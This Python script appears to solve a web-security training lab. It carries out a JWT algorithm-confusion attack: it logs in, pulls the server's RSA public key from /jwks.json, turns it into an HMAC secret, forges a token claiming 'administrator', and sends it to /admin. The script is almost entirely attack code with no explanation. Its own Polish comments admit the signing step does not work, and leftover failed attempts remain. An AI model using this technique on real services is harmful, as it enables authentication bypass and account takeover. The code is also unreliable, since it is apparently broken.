import jwt
import base64
import json
from jwcrypto import jwk
import sys
import requests
import re

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Usage: python3 script.py <url>")
        sys.exit(1)

burp_url = sys.argv[1]
login_url = burp_url + '/login'
public_key_url = burp_url + '/jwks.json'
admin_url = burp_url + '/admin'
delete_url = burp_url + '/admin/delete?username=carlos'

session = requests.Session()
response = session.get(login_url)
csrf = re.search(r'<input required type="hidden" name="csrf" value="([^"]+)"', response.text).group(1)
burp_data = {"csrf": csrf,"username": "wiener", "password": "peter"}
session.post(login_url, data=burp_data, allow_redirects=False)

response = session.get(public_key_url)
n_value = re.search(r'"n":\s*"(.*?)"',response.text).group(1)

response = session.get(public_key_url)
full_public_key_from_server = re.search(r'\[(.*?)\]',response.text).group(1)

cookies = response.cookies
session_cookie = session.cookies.get('session')
decoded_token = jwt.decode(session_cookie, options={"verify_signature": False})
decoded_token["sub"] = "administrator"
header, payload, signature = session_cookie.split('.')
decoded_header = json.loads(base64.urlsafe_b64decode(header + "==").decode('utf-8'))
kid_value = decoded_header.get("kid")

def jwk_to_pem(jwk_data):
    key = jwk.JWK(**jwk_data).export_to_pem()
    return key.decode()

jwk_dict = json.loads(full_public_key_from_server)

pem = jwk_to_pem(jwk_dict)
x = pem
b64_encoded_pem = base64.b64encode(x.encode()).decode()
raw_data = {"kty": "oct","kid": "e1b23fbd-ec4e-4388-b26f-1b582a38df5f","k": b64_encoded_pem}
#print(raw_data)
symmetric_key = json.dumps(raw_data)

print(symmetric_key)

working_decoded_token = json.dumps(decoded_token)
#working_decoded_token = json.loads(decoded_token)
print(working_decoded_token)
print(type(working_decoded_token))

#print(type(decoded_token))

#do tego momentu wszystko dziala. Cos nie tak z podpisaniem jest
#print(decoded_token)

#encoded = jwt.encode(decoded_token, symmetric_key, algorithm="HS256", headers={"typ": None, "kid": kid_value})
#encoded = jwt.encode(decoded_token, symmetric_key, algorithm="HS256", headers={"kid": kid_value})
#encoded = jwt.encode(decoded_token, symmetric_key, algorithm="HS256", headers={"typ": None, "kid": kid_value})

#do tego momentu wszystko dziala. Cos nie tak z podpisaniem jest
encoded = jwt.encode(decoded_token, symmetric_key, algorithm="HS256", headers={"typ": None, "kid": kid_value})


print(encoded)
#encoded = jwt.encode(json.loads(json.dumps(decoded_token)), symmetric_key, algorithm="HS256", headers={"typ": None, "kid": kid_value})
#print(encoded)

burp_cookie = {"session": encoded}
r = session.get(admin_url, cookies=burp_cookie)
print(r.status_code)
